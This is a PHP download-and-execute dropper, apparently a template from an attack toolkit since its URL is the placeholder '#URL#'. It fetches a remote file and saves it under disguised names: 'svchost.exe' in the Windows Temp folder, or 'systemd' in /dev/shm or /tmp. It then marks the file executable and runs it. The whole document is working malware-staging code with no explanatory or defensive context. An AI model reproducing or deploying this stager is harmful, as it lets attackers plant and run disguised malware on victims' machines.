$url = "#URL#";

function pjoin() {
  $paths = array();

  foreach (func_get_args() as $arg) {
    if ($arg !== '') { $paths[] = $arg; }
  }

  return preg_replace('#/+#','/',join('/', $paths));
}

$is_win = strtoupper(substr(PHP_OS, 0, 3)) === "WIN";

if ($is_win) {
  $user = getenv("USERPROFILE");
  $path = pjoin($user, "/AppData/Local/Temp/svchost.exe");
} else {
  if(file_exists("/dev/shm") && is_dir("/dev/shm")){
    $path = "/dev/shm/systemd";
  }else {
    $path = "/tmp/systemd";
  }
}

if (!file_put_contents($path, file_get_contents($url))) { 
  exit(0);
}

if (!$is_win) {
  chmod($path, 0700);
}

exec($path);
